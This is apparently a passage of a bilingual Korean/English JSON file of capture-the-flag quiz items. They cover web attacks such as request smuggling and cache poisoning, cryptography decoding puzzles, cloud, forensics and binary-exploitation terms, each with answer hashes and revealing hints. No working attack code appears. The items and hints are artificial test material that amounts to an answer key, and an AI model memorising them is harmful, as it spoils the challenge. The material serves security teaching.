        "이 헤더가 `true` 이면 ACAO 는 와일드카드 `*` 를 쓸 수 없습니다."
      ],
      "en": [
        "It governs whether the authenticated session may be sent at all.",
        "When it is `true`, ACAO cannot use the wildcard `*`."
      ]
    }
  },
  {
    "id": "t4_smuggling",
    "tier": 4,
    "cat": "web",
    "track": "web",
    "points": 170,
    "ci": true,
    "hash": "1ecb76524bc07187f9be47535fc44a9dff07e6d525396d40b2a441c9a52ab523",
    "fmt": "약어 / acronym (예: AB.CD / e.g. AB.CD)",
    "title": {
      "ko": "두 서버의 엇갈린 셈",
      "en": "Two Servers Disagree"
    },
    "prompt": {
      "ko": "HTTP 요청 스머글링에서 프런트엔드 프록시는 `Content-Length` 헤더로 요청 경계를 판단하고, 백엔드 서버는 `Transfer-Encoding: chunked` 를 신뢰합니다. 이렇게 프런트=CL, 백엔드=TE 로 엇갈리는 고전적 스머글링 유형을 부르는 점(.) 포함 표준 약칭은? (예: `AB.CD` 형태)",
      "en": "In HTTP request smuggling the front-end proxy uses the `Content-Length` header to find the request boundary, while the back-end trusts `Transfer-Encoding: chunked`. What is the dotted standard abbreviation for this classic front-end=CL, back-end=TE mismatch? (form `AB.CD`)"
    },
    "hints": {
      "ko": [
        "프런트=Content-Length, 백엔드=Transfer-Encoding 순서 그대로 약칭이 됩니다.",
        "정반대 조합은 `TE.CL` 입니다."
      ],
      "en": [
        "The abbreviation follows the order front=Content-Length, back=Transfer-Encoding.",
        "The mirror-image variant is `TE.CL`."
      ]
    }
  },
  {
    "id": "t4_oauth",
    "tier": 4,
    "cat": "web",
    "track": "web",
    "points": 160,
    "ci": true,
    "hash": "ca74bea00c269f053d5ac8df6f09be5b1e86f973195de3fd98e4a1e9838ce8e0",
    "fmt": "약어 / acronym (4글자 / 4 chars)",
    "title": {
      "ko": "가로챈 코드를 무력화하라",
      "en": "Neutralize the Stolen Code"
    },
    "prompt": {
      "ko": "모바일·SPA 같은 공개 클라이언트에서 OAuth 2.0 인가 코드가 가로채여도 재사용을 막기 위해, 클라이언트가 임의의 `code_verifier` 와 그 해시인 `code_challenge` 를 주고받도록 한 확장 규격의 4글자 약어는?",
      "en": "For public clients (mobile / SPA), which 4-letter OAuth 2.0 extension makes the client exchange a random `code_verifier` and its hash `code_challenge`, so a stolen authorization code cannot be replayed?"
    },
    "hints": {
      "ko": [
        "Proof Key for Code Exchange 의 약어입니다.",
        "흔히 '픽시' 라고 읽습니다. (RFC 7636)"
      ],
      "en": [
        "Acronym of 'Proof Key for Code Exchange'.",
        "Commonly pronounced 'pixy'. (RFC 7636)"
      ]
    }
  },
  {
    "id": "t4_cachepoison",
    "tier": 4,
    "cat": "web",
    "track": "web",
    "points": 160,
    "ci": true,
    "hash": "4740ae6347b0172c01254ff55bae5aff5199f4446e7f6d643d40185b3f475145",
    "fmt": "헤더 접미사 / header suffix",
    "title": {
      "ko": "캐시를 오염시키는 헤더",
      "en": "The Header That Poisons the Cache"
    },
    "prompt": {
      "ko": "웹 캐시 포이즈닝과 비밀번호 재설정 오염 공격에서, 앱이 절대 URL(예: 재설정 링크)을 만들 때 요청에서 그대로 신뢰하면 위험한 대표적 '언키드(캐시 키 미포함)' 요청 헤더는? `X-Forwarded-____`",
      "en": "In web cache poisoning and password-reset poisoning, which classic 'unkeyed' request header is dangerous when an app trusts it to build absolute URLs (e.g. a reset link)? `X-Forwarded-____`"
    },
    "hints": {
      "ko": [
        "리버스 프록시가 원래 요청의 호스트명을 뒤로 전달할 때 쓰는 헤더입니다.",
        "`X-Forwarded-For` 의 형제이지만, 이건 IP 가 아니라 호스트명을 담습니다."
      ],
      "en": [
        "The header a reverse proxy uses to pass the original hostname downstream.",
        "A sibling of `X-Forwarded-For`, but it carries the hostname, not the IP."
      ]
    }
  },
  {
    "id": "t4_triple",
    "tier": 4,
    "cat": "crypto",
    "track": "crypto",
    "points": 190,
    "ci": false,
    "hash": "d8f1ab639e9c7877747b5825382feaed6b51ea3c0d5f81a90d9ccb0c3b984bcd",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "3중 인코딩",
      "en": "Triple encoding"
    },
    "prompt": {
      "ko": "ROT13 → Base64 → Hex 순서로 풀면 플래그가 나옵니다:\n\n`AQL0LmDkAQp3Lwp0Awt3ZwL1AwH1MwMwAwR3BGL1AmV3ZmIzAwD2AGL1AmN3MN==`",
      "en": "Undo in order ROT13 → Base64 → Hex to get the flag:\n\n`AQL0LmDkAQp3Lwp0Awt3ZwL1AwH1MwMwAwR3BGL1AmV3ZmIzAwD2AGL1AmN3MN==`"
    },
    "hints": {
      "ko": [
        "1) ROT13 해제 → Base64 문자열.",
        "2) Base64 디코드 → 16진 문자열 → Hex 디코드."
      ],
      "en": [
        "1) Undo ROT13 → a Base64 string.",
        "2) Base64-decode → a hex string → hex-decode."
      ]
    }
  },
  {
    "id": "t4_vigenere",
    "tier": 4,
    "cat": "crypto",
    "track": "crypto",
    "points": 170,
    "ci": false,
    "hash": "cf7605469817d11a1dc936926136f51e1852fe1c98b6d5ad6779215ea8af56a1",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "비제네르 — 금고 열쇠",
      "en": "Vigenère — the vault key"
    },
    "prompt": {
      "ko": "키 `VAULT` 로 암호화된 비제네르 암호문입니다. 복호화하세요:\n\n`ALUR{mce_plngt_cd_hkeh}`",
      "en": "Vigenère ciphertext encrypted with key `VAULT`. Decrypt:\n\n`ALUR{mce_plngt_cd_hkeh}`"
    },
    "hints": {
      "ko": [
        "키가 더 길어졌을 뿐, 방식은 같습니다.",
        "key=VAULT 로 Vigenère 복호화."
      ],
      "en": [
        "Longer key, same method.",
        "Vigenère-decode with key=VAULT."
      ]
    }
  },
  {
    "id": "t4_xorcore",
    "tier": 4,
    "cat": "crypto",
    "track": "crypto",
    "points": 160,
    "ci": false,
    "hash": "4fe235bfac29a6809e5f013f34afd71c3ae29d879ed3da3806f3b8a93064023b",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "코어 키 XOR",
      "en": "Core-key XOR"
    },
    "prompt": {
      "ko": "반복 키 `core` 로 XOR된 16진 바이트열입니다. 복호화하세요:\n\n`2523332218171d173c181b110b30110a110a2d0e06160f`",
      "en": "Hex bytes XORed with the repeating key `core`. Decrypt:\n\n`2523332218171d173c181b110b30110a110a2d0e06160f`"
    },
    "hints": {
      "ko": [
        "4바이트 키가 반복됩니다.",
        "`bytes[i] ^ \"core\"[i % 4]`"
      ],
      "en": [
        "A 4-byte key repeats.",
        "`bytes[i] ^ \"core\"[i % 4]`"
      ]
    }
  },
  {
    "id": "t4_k8ssecret",
    "tier": 4,
    "cat": "cloud",
    "track": "cloud",
    "points": 130,
    "ci": false,
    "hash": "05863231fff72c94d36adaa599b06f72c398e574a753c53f5ff1d79d770fe214",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "쿠버네티스 Secret",
      "en": "Kubernetes Secret"
    },
    "prompt": {
      "ko": "쿠버네티스 Secret의 `data` 값은 암호화가 아니라 Base64일 뿐입니다. 다음 값을 디코딩하세요:\n\n`RkxBR3trOHNfc2VjcmV0X29ubHlfYmFzZTY0fQ==`",
      "en": "A Kubernetes Secret `data` value is only Base64, not encrypted. Decode this value:\n\n`RkxBR3trOHNfc2VjcmV0X29ubHlfYmFzZTY0fQ==`"
    },
    "hints": {
      "ko": [
        "`kubectl get secret -o yaml` 로 보이는 그 값.",
        "Base64 디코드 한 번."
      ],
      "en": [
        "The value you see in `kubectl get secret -o yaml`.",
        "One Base64 decode."
      ]
    }
  },
  {
    "id": "t4_doubleb64",
    "tier": 4,
    "cat": "crypto",
    "track": "crypto",
    "points": 140,
    "ci": false,
    "hash": "ef2e0a4e4f05b322720c231e530590f86bbc349b6ff5d4651ff1c32cbf7bb360",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "이중 Base64",
      "en": "Double Base64"
    },
    "prompt": {
      "ko": "Base64로 두 번 감쌌습니다. 두 번 디코딩하세요:\n\n`Umt4QlIzdGtiM1ZpYkdWZlltRnpaVFkwWDNkeVlYQjk=`",
      "en": "Wrapped in Base64 twice. Decode twice:\n\n`Umt4QlIzdGtiM1ZpYkdWZlltRnpaVFkwWDNkeVlYQjk=`"
    },
    "hints": {
      "ko": [
        "디코드 결과가 또 Base64처럼 보입니다.",
        "`atob(atob(\"...\"))`"
      ],
      "en": [
        "The first decode looks like Base64 again.",
        "`atob(atob(\"...\"))`"
      ]
    }
  },
  {
    "id": "t0_md5",
    "tier": 0,
    "cat": "forensics",
    "track": "forensics",
    "points": 40,
    "ci": true,
    "hash": "3ebff31b62c0637c54d4ffa990d5c100ea359994b35f4b342ff49797542148cd",
    "fmt": "알고리즘 이름 / algorithm name (3글자 / 3 chars)",
    "title": {
      "ko": "파일의 지문",
      "en": "The File's Fingerprint"
    },
    "prompt": {
      "ko": "증거 원본과 사본이 동일함을 증명하기 위해 파일의 '지문'을 계산하는 데 쓰이는, 128비트(32자 16진수) 값을 만드는 대표적인 (오늘날 충돌 공격에 취약하다고 알려진) 해시 알고리즘은?",
      "en": "Which classic hash algorithm (now known to be vulnerable to collision attacks), producing a 128-bit / 32-hex-digit value, is used to prove a forensic copy matches the original?"
    },
    "hints": {
      "ko": [
        "Message Digest 의 약자.",
        "결과값이 128비트(32자 16진수)."
      ],
      "en": [
        "Stands for Message Digest.",
        "128-bit output = 32 hex chars."
      ]
    }
  },
  {
    "id": "t0_hexdump",
    "tier": 0,
    "cat": "forensics",
    "track": "forensics",
    "points": 50,
    "ci": true,
    "hash": "b2d7da50ce9ad432c1ac5febf709d834a84db529b7acf0fa69d7d3f8ae6b7e81",
    "fmt": "명령어 / command",
    "title": {
      "ko": "바이트를 있는 그대로",
      "en": "Bytes As They Are"
    },
    "prompt": {
      "ko": "파일의 원본 바이트를 16진수와 ASCII를 나란히 보여주는 형태로 덤프하는 리눅스 명령어는? (`-C` 옵션으로 정규 형식 출력, 세 글자)",
      "en": "Which three-letter Linux command dumps a file's raw bytes as hex next to ASCII (canonical format with `-C`)?"
    },
    "hints": {
      "ko": [
        "vim 에도 내장되어 있는 도구입니다.",
        "`___ -C file | less`"
      ],
      "en": [
        "Also bundled with vim.",
        "`___ -C file | less`"
      ]
    }
  },
  {
    "id": "t4_prefetch",
    "tier": 4,
    "cat": "forensics",
    "track": "forensics",
    "points": 150,
    "ci": true,
    "hash": "4653c580b63bba1b5cd175c99bd2f3dbc73ec41694bc304be2e41e1f05bb81cd",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "실행의 흔적",
      "en": "Trace of Execution"
    },
    "prompt": {
      "ko": "Windows에서 프로그램의 실행 횟수·마지막 실행 시각·로드된 DLL 목록을 담아 `.pf` 파일로 저장되어, 악성코드 실행 흔적 조사의 핵심 아티팩트가 되는 기능의 이름은? (한 단어)",
      "en": "Which Windows feature stores `.pf` files recording a program's run count, last-run time, and loaded DLLs — a key artifact for proving malware execution?"
    },
    "hints": {
      "ko": [
        "`C:\\Windows\\Prefetch\\` 경로에 저장됩니다.",
        "파일명 예: NOTEPAD.EXE-1234ABCD.pf"
      ],
      "en": [
        "Stored under `C:\\Windows\\Prefetch\\`.",
        "Filenames look like NOTEPAD.EXE-1234ABCD.pf."
      ]
    }
  },
  {
    "id": "t4_volatility",
    "tier": 4,
    "cat": "malware",
    "track": "forensics",
    "points": 160,
    "ci": false,
    "hash": "b6166140437944900b8b211e213905931ce1c8ed0ace53320b40c17d4a721da1",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "메모리 속 단서",
      "en": "Clue in Memory"
    },
    "prompt": {
      "ko": "메모리 덤프를 분석하는 대표 오픈소스 프레임워크로 `strings`와 플러그인을 이용해 프로세스 목록·네트워크 연결을 복구하던 중, 수상한 Base64 문자열을 찾았습니다. 디코딩하세요:\n\n`RkxBR3ttZW1vcnlfZm9yZW5zaWNzX3dpbnN9`",
      "en": "While recovering process lists and network connections from a memory dump with the standard open-source memory forensics framework, you find a suspicious Base64 string. Decode it:\n\n`RkxBR3ttZW1vcnlfZm9yZW5zaWNzX3dpbnN9`"
    },
    "hints": {
      "ko": [
        "그 프레임워크의 이름은 'Volatility' 입니다(힌트일 뿐, 답 아님).",
        "`echo '...' | base64 -d` 또는 `atob('...')`"
      ],
      "en": [
        "The framework is called 'Volatility' (that's just a hint, not the answer).",
        "`echo '...' | base64 -d` or `atob('...')`"
      ]
    }
  },
  {
    "id": "t0_iam",
    "tier": 0,
    "cat": "cloud",
    "track": "cloud",
    "points": 40,
    "ci": true,
    "hash": "d457e3a99392a03f47057f50ac1cbc5d0365131575477971bf85177a0c0fed22",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "누가 무엇을 할 수 있는가",
      "en": "Who Can Do What"
    },
    "prompt": {
      "ko": "AWS·Azure·GCP 등 클라우드에서 사용자·역할(Role)·정책(Policy)을 통해 '누가 무엇을 할 수 있는지'를 관리하는 서비스의 공통 약자는?",
      "en": "What abbreviation names the cloud service (common across AWS/Azure/GCP) that manages users, roles, and policies to control 'who can do what'?"
    },
    "hints": {
      "ko": [
        "Identity and Access Management 의 약자.",
        "세 글자."
      ],
      "en": [
        "Abbreviation for Identity and Access Management.",
        "Three letters."
      ]
    }
  },
  {
    "id": "t0_vpc",
    "tier": 0,
    "cat": "cloud",
    "track": "cloud",
    "points": 50,
    "ci": true,
    "hash": "38faba71b3a6cfc9e5f93fe6a17abe770093ba938baa488aa016fca907eadcaa",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "나만의 가상 네트워크",
      "en": "My Own Virtual Network"
    },
    "prompt": {
      "ko": "클라우드에서 논리적으로 격리된, 서브넷·라우팅테이블·보안그룹을 담는 나만의 가상 네트워크를 부르는 AWS 용어의 약자는?",
      "en": "What abbreviation names the logically isolated virtual network (containing subnets, route tables, security groups) an AWS account gets?"
    },
    "hints": {
      "ko": [
        "Virtual Private Cloud 의 약자.",
        "세 글자."
      ],
      "en": [
        "Abbreviation for Virtual Private Cloud.",
        "Three letters."
      ]
    }
  },
  {
    "id": "t1_arn",
    "tier": 1,
    "cat": "cloud",
    "track": "cloud",
    "points": 60,
    "ci": true,
    "hash": "42e7ab5b52beca9d20fbc05fa6b72c0a48755ada50d340472ab6f1832cbf42ac",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "리소스의 고유 이름표",
      "en": "The Resource's Unique Tag"
    },
    "prompt": {
      "ko": "AWS에서 모든 리소스(사용자·버킷·함수 등)를 `arn:aws:서비스:리전:계정ID:리소스` 형태로 고유하게 식별하는 문자열 형식의 약자는?",
      "en": "What abbreviation names the string format (`arn:aws:service:region:account-id:resource`) that uniquely identifies every AWS resource?"
    },
    "hints": {
      "ko": [
        "Amazon Resource Name 의 약자.",
        "세 글자."
      ],
      "en": [
        "Abbreviation for Amazon Resource Name.",
        "Three letters."
      ]
    }
  },
  {
    "id": "t1_snapshot",
    "tier": 1,
    "cat": "cloud",
    "track": "cloud",
    "points": 65,
    "ci": true,
    "hash": "16a0eeb0791b6c92451fd284dd9f599e0a7dbe7f6ebea6e2d2d06c7f74aec112",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "그 순간을 저장하다",
      "en": "Freeze That Moment"
    },
    "prompt": {
      "ko": "클라우드 스토리지/볼륨(EBS 등)의 특정 시점 상태를 통째로 백업해두는 기능을 부르는, 명사로도 동사로도 쓰이는 한 단어는?",
      "en": "What single word (used as both noun and verb) names a point-in-time backup of a cloud volume like EBS?"
    },
    "hints": {
      "ko": [
        "사진 찍듯 그 순간을 '찰칵' 저장합니다.",
        "카메라 관련 단어에서 유래."
      ],
      "en": [
        "Captures a moment like a photo.",
        "Borrowed from camera terminology."
      ]
    }
  },
  {
    "id": "t4_aslr",
    "tier": 4,
    "cat": "pwn",
    "track": "system",
    "points": 140,
    "ci": true,
    "hash": "738ab575cf55699b4b9eb6ef605a20282cf7363f4cf086867bd42da96ec22498",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "매번 바뀌는 주소",
      "en": "The Address Keeps Moving"
    },
    "prompt": {
      "ko": "스택·힙·라이브러리의 메모리 주소를 매 실행마다 무작위화해 익스플로잇의 주소 하드코딩을 어렵게 만드는 OS 보호 기법의 약자는?",
      "en": "What abbreviation names the OS protection that randomizes stack/heap/library addresses on every run, defeating hardcoded exploit addresses?"
    },
    "hints": {
      "ko": [
        "Address Space Layout Randomization 의 약자.",
        "`/proc/sys/kernel/randomize_va_space` 로 리눅스에서 제어합니다."
      ],
      "en": [
        "Abbreviation for Address Space Layout Randomization.",
        "Controlled via `/proc/sys/kernel/randomize_va_space` on Linux."
      ]
    }
  },
  {
    "id": "t4_canary",
    "tier": 4,
    "cat": "pwn",
    "track": "system",
    "points": 150,
    "ci": true,
    "hash": "e100fbce008c04ec40637af0af91fb2f05aeedc23f856a2d3c0b1580625d755e",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "탄광 속의 그 새",
      "en": "The Bird in the Mine"
    },
    "prompt": {
      "ko": "함수 리턴 직전 스택에 심어둔 무작위 값이 변조되었는지 검사해 스택 버퍼 오버플로우를 탐지하는 보호 기법을, 탄광에서 유독가스를 미리 감지하던 새의 이름을 따서 부르는 한 단어는?",
      "en": "Which stack buffer overflow protection (checking a random value planted before return for tampering) is named after the bird once used to detect toxic fumes in mines?"
    },
    "hints": {
      "ko": [
        "GCC의 `-fstack-protector` 가 이 값을 심습니다.",
        "'탄광 속 카나리아'라는 관용구에서 유래."
      ],
      "en": [
        "GCC's `-fstack-protector` inserts this value.",
        "From the idiom about the bird kept in a coal mine."
      ]
    }
  },
  {
    "id": "t0_sigkill",
    "tier": 0,
    "cat": "linux",
    "track": "system",
    "points": 40,
    "ci": true,
    "hash": "19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7",
    "fmt": "숫자 / number",
    "title": {
      "ko": "프로세스를 강제 종료",
      "en": "Force Kill a Process"
    },
    "prompt": {
      "ko": "리눅스에서 `kill -9 <PID>` 처럼 프로세스를 즉시 강제 종료할 때 쓰이는 시그널 번호는? (숫자만)",
      "en": "Which signal number does `kill -9 <PID>` send to immediately force-kill a process on Linux? (number only)"
    },
    "hints": {
      "ko": [
        "절대 무시하거나 처리할 수 없는 시그널입니다.",
        "SIGKILL의 번호입니다."
      ],
      "en": [
        "A signal that can never be caught or ignored.",
        "It's the number for SIGKILL."
      ]
    }
  },
  {
    "id": "t1_symlink",
    "tier": 1,
    "cat": "linux",
    "track": "system",
    "points": 65,
    "ci": true,
    "hash": "660ea4d709cf6a4f8bd150f1c89c754d23aa0b1ea2c53e537141a466b092c2a5",
    "fmt": "명령어 / command",
    "title": {
      "ko": "가리키기만 하는 파일",
      "en": "A File That Just Points"
    },
    "prompt": {
      "ko": "원본 파일을 가리키기만 하는 심볼릭 링크(바로가기)를 만드는 명령은? (옵션 포함, 예: `cmd -o target link`)",
      "en": "Which command (with its flag) creates a symbolic link pointing to a target file? (e.g. `cmd -o target link`)"
    },
    "hints": {
      "ko": [
        "`ln` 명령에 옵션 하나를 더합니다.",
        "`-s` (symbolic)."
      ],
      "en": [
        "Add one flag to the `ln` command.",
        "`-s` for symbolic."
      ]
    }
  },
  {
    "id": "t2_procmon",
    "tier": 2,
    "cat": "windows",
    "track": "system",
    "points": 85,
    "ci": true,
    "hash": "d86580392e249926e944c40917377c0428bb1afc300fe31d4d321900da973495",
    "fmt": "도구 이름 / tool name",
    "title": {
      "ko": "실시간으로 훔쳐보기",
      "en": "Watching in Real Time"
    },
    "prompt": {
      "ko": "Windows에서 프로세스·파일·레지스트리 접근을 실시간으로 감시해 악성코드 행위 분석에 널리 쓰이는 Sysinternals 도구의 이름은?",
      "en": "Which Sysinternals tool monitors real-time process/file/registry activity on Windows and is widely used for malware behavior analysis?"
    },
    "hints": {
      "ko": [
        "Sysinternals Suite에 포함된 도구입니다.",
        "'Process'와 'Monitor'의 합성(줄임말)."
      ],
      "en": [
        "Part of the Sysinternals Suite.",
        "A blend of 'Process' and 'Monitor'."
      ]
    }
  },
  {
    "id": "t2_lsof",
    "tier": 2,
    "cat": "linux",
    "track": "system",
    "points": 85,
    "ci": true,
    "hash": "cb298bd94fae6f2f713a1108a16e0632f3a1e21820a288d7ea86c8b00a4d4fef",
    "fmt": "명령어 / command",
    "title": {
      "ko": "열린 파일 목록",
      "en": "List Open Files"
    },
    "prompt": {
      "ko": "리눅스에서 특정 프로세스가 열어둔 파일·소켓·라이브러리를 나열하는 명령은? (명령어만)",
      "en": "Which Linux command lists the open files, sockets, and libraries held by a process? (command only)"
    },
    "hints": {
      "ko": [
        "이름 자체가 'list open files'의 줄임말입니다.",
        "`____ -p <PID>`"
      ],
      "en": [
        "Its name is literally short for 'list open files'.",
        "`____ -p <PID>`"
      ]
    }
  },
  {
    "id": "t4_rop",
    "tier": 4,
    "cat": "pwn",
    "track": "system",
    "points": 150,
    "ci": true,
    "hash": "d1e909483b98bf9e8b8c2ae3e1688365ecb2e7b75286c9784646d3d76c1c0dc6",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "이미 있는 조각을 이어붙이다",
      "en": "Chaining What's Already There"
    },
    "prompt": {
      "ko": "DEP/NX로 스택 실행이 막혔을 때, 바이너리에 이미 존재하는 코드 조각(가젯)들을 이어붙여 임의 코드 실행을 흉내내는 익스플로잇 기법의 약자는?",
      "en": "When DEP/NX blocks stack execution, which exploitation technique's abbreviation names chaining existing code gadgets already in the binary to simulate arbitrary execution?"
    },
    "hints": {
      "ko": [
        "Return-Oriented Programming 의 약자.",
        "`ret` 명령으로 끝나는 가젯들을 이어붙입니다."
      ],
      "en": [
        "Abbreviation for Return-Oriented Programming.",
        "Chains gadgets that each end in a `ret`."
      ]
    }
  },
  {
    "id": "t4_uaf",
    "tier": 4,
    "cat": "pwn",
    "track": "system",
    "points": 160,
    "ci": true,
    "hash": "9e92f50f72fc1a740d5187ba781df8f89cf52b3085e6c49334945dca8a2f53db",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "이미 해제된 메모리",
      "en": "Memory After It's Freed"
    },
    "prompt": {
      "ko": "`free()`로 이미 해제된 힙 메모리에 남은 포인터로 계속 접근해 발생하는, 브라우저·커널 익스플로잇에서 흔한 취약점 유형의 약자는?",
      "en": "Which vulnerability class's abbreviation names accessing heap memory through a dangling pointer after it's already been `free()`'d — common in browser and kernel exploits?"
    },
    "hints": {
      "ko": [
        "Use-After-Free 의 약자.",
        "세 글자."
      ],
      "en": [
        "Abbreviation for Use-After-Free.",
        "Three letters."
      ]
    }
  },
  {
    "id": "t0_region",
    "tier": 0,
    "cat": "cloud",
    "track": "cloud",
    "points": 45,
    "ci": true,
    "hash": "c697d2981bf416569a16cfbcdec1542b5398f3cc77d2b905819aa99c46ecf6f6",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "데이터센터의 큰 단위",
      "en": "A Big Slice of Datacenters"
    },
    "prompt": {
      "ko": "AWS/GCP/Azure 등 클라우드에서 지리적으로 분리된 데이터센터 묶음(예: `ap-northeast-2`)을 부르는 한 단어는?",
      "en": "What single word names a geographically separate cluster of cloud datacenters (e.g. `ap-northeast-2`)?"
    },
    "hints": {
      "ko": [
        "가용영역(AZ)보다 더 큰 단위입니다.",
        "지역/지방을 뜻하는 영단어."
      ],
      "en": [
        "Bigger than an Availability Zone.",
        "The English word for a geographic area."
      ]
    }
  },
  {
    "id": "t0_cdn",
    "tier": 0,
    "cat": "cloud",
    "track": "cloud",
    "points": 45,
    "ci": true,
    "hash": "db9831b53a8574d33f3d7ce6820598c67224687dbe57cbbc10b6070e5aa57744",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "가까운 곳에서 전송",
      "en": "Served from Near You"
    },
    "prompt": {
      "ko": "전 세계 엣지 서버에 콘텐츠를 캐싱해 사용자와 가까운 곳에서 전송함으로써 지연을 줄이는 네트워크를 가리키는 3글자 약어는? (AWS의 CloudFront가 대표 예)",
      "en": "What 3-letter abbreviation names the network of globally distributed edge servers that caches content close to users to cut latency? (AWS CloudFront is one example)"
    },
    "hints": {
      "ko": [
        "Content Delivery Network.",
        "정적 파일(이미지·JS)을 엣지에서 제공합니다."
      ],
      "en": [
        "Content Delivery Network.",
        "Serves static assets (images, JS) from the edge."
      ]
    }
  },
  {
    "id": "t1_lb",
    "tier": 1,
    "cat": "cloud",
    "track": "cloud",
    "points": 65,
    "ci": true,
    "hash": "7a34bf90b5e9eecc91c3c8418a343ae9fba263400f7ae1e6ddb67abe0f7a453a",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "트래픽을 나눠주는 것",
      "en": "Splitting the Traffic"
    },
    "prompt": {
      "ko": "여러 서버 인스턴스에 들어오는 요청을 고르게 분산시켜주는 서비스를 부르는 두 단어(약자 아님)는?",
      "en": "What two-word term (not an abbreviation) names the service that distributes incoming requests evenly across multiple server instances?"
    },
    "hints": {
      "ko": [
        "AWS의 ELB/ALB가 이 역할을 합니다.",
        "'짐을 고르게 나누는 장치'를 뜻하는 영단어 두 개 — 행위(-ing)가 아니라 장치(-er)의 이름입니다."
      ],
      "en": [
        "AWS's ELB/ALB serve this role.",
        "Two English words for the thing that spreads the weight evenly — name the device (-er), not the activity (-ing)."
      ]
    }
  },
  {
    "id": "t3_assumerole",
    "tier": 3,
    "cat": "cloud",
    "track": "cloud",
    "points": 125,
    "ci": true,
    "hash": "776a88039ef9efe803d63e13848afb8ea36d612d3fb5df9c364148e30ad9ca45",
    "fmt": "API 액션 / API action",
    "title": {
      "ko": "역할을 빌려쓰다",
      "en": "Borrowing a Role"
    },
    "prompt": {
      "ko": "AWS에서 다른 역할의 임시 자격 증명을 발급받기 위해 호출하는 STS API 액션의 이름은? (예: `sts:________`)",
      "en": "Which STS API action do you call in AWS to obtain temporary keys for another role? (e.g. `sts:________`)"
    },
    "hints": {
      "ko": [
        "역할을 '가정한다(assume)'는 뜻입니다.",
        "CamelCase 두 단어가 붙어 있습니다."
      ],
      "en": [
        "It means to 'assume' a role.",
        "Two CamelCase words joined together."
      ]
    }
  },
  {
    "id": "t3_cspm",
    "tier": 3,
    "cat": "cloud",
    "track": "cloud",
    "points": 130,
    "ci": true,
    "hash": "5d269f85e3e967c8a49655adcd5090ab75980245bcb66eba8e6f056413dc80e7",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "설정 실수를 계속 감시하다",
      "en": "Watching for Misconfigurations"
    },
    "prompt": {
      "ko": "클라우드 인프라의 오설정(퍼블릭 버킷, 과도한 권한 부여 등)을 지속적으로 스캔·경고하는 보안 도구 카테고리의 약자는?",
      "en": "What abbreviation names the security tool category that continuously scans and alerts on cloud misconfigurations (public buckets, excessive permissions, etc.)?"
    },
    "hints": {
      "ko": [
        "Cloud Security Posture Management 의 약자.",
        "네 글자."
      ],
      "en": [
        "Abbreviation for Cloud Security Posture Management.",
        "Four letters."
      ]
    }
  },
  {
    "id": "t4_coldstart",
    "tier": 4,
    "cat": "cloud",
    "track": "cloud",
    "points": 140,
    "ci": true,
    "hash": "2ab729086fade508b332db3792a12c723cc78cab48f5d1ec8f4a4245fd79d623",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "처음 깨어날 때는 느리다",
      "en": "Slow to Wake Up"
    },
    "prompt": {
      "ko": "서버리스 함수(AWS Lambda 등)가 한동안 호출되지 않아 새로 초기화되면서 지연이 발생하는 현상을 부르는 두 단어(예: `___ start`)는?",
      "en": "What two-word term (e.g. `___ start`) names the latency that occurs when a serverless function (like AWS Lambda) must initialize from scratch after being idle?"
    },
    "hints": {
      "ko": [
        "반대말은 'warm start'입니다.",
        "온도를 뜻하는 형용사 + start."
      ],
      "en": [
        "The opposite is a 'warm start'.",
        "A temperature adjective + start."
      ]
    }
  },
  {
    "id": "t0_forensicimage",
    "tier": 0,
    "cat": "forensics",
    "track": "forensics",
    "points": 50,
    "ci": true,
    "hash": "b75b0489f78a9bae128f5fb590705c68e6bd9110fbdfec40721575c177d38c86",
    "fmt": "두 단어 / two words",
    "title": {
      "ko": "원본을 건드리지 않는 사본",
      "en": "A Copy That Never Touches the Original"
    },
    "prompt": {
      "ko": "디지털 포렌식에서 원본 증거를 변경하지 않기 위해 비트 단위로 통째로 복제해두는 사본을 부르는 두 단어(예: `forensic ___`)는?",
      "en": "What two-word term (e.g. `forensic ___`) names a bit-for-bit copy made so the original evidence is never altered during digital forensics?"
    },
    "hints": {
      "ko": [
        "FTK Imager 같은 이미징 도구로 만듭니다.",
        "'그림/사본'을 뜻하는 영단어가 뒤에 옵니다."
      ],
      "en": [
        "Made with imaging tools such as FTK Imager.",
        "Ends with the word meaning 'a copy/picture'."
      ]
    }
  },
  {
    "id": "t1_pcap",
    "tier": 1,
    "cat": "network",
    "track": "forensics",
    "points": 60,
    "ci": true,
    "hash": "ff3ed7cbf694b9da51b7617e827def2dfaf824596500228573f4cd5857793b33",
    "fmt": "확장자 / extension",
    "title": {
      "ko": "캡처한 패킷의 확장자",
      "en": "Extension for Captured Packets"
    },
    "prompt": {
      "ko": "Wireshark/tcpdump로 캡처한 네트워크 패킷 파일의 표준 확장자는? (점 없이, 소문자)",
      "en": "What is the standard file extension for a network packet capture from Wireshark/tcpdump? (no dot, lowercase)"
    },
    "hints": {
      "ko": [
        "'packet capture'의 줄임말입니다.",
        "네 글자."
      ],
      "en": [
        "Short for 'packet capture'.",
        "Four letters."
      ]
    }
  },
  {
    "id": "t1_custody",
    "tier": 1,
    "cat": "forensics",
    "track": "forensics",
    "points": 70,
    "ci": true,
    "hash": "5a77bdc97e1a5cdb8b99a3f6163306eb890f6b0c9b660c71b62fa9a176e75297",
    "fmt": "문구 / phrase",
    "title": {
      "ko": "증거가 거쳐온 손길의 기록",
      "en": "The Record of Every Hand It Passed Through"
    },
    "prompt": {
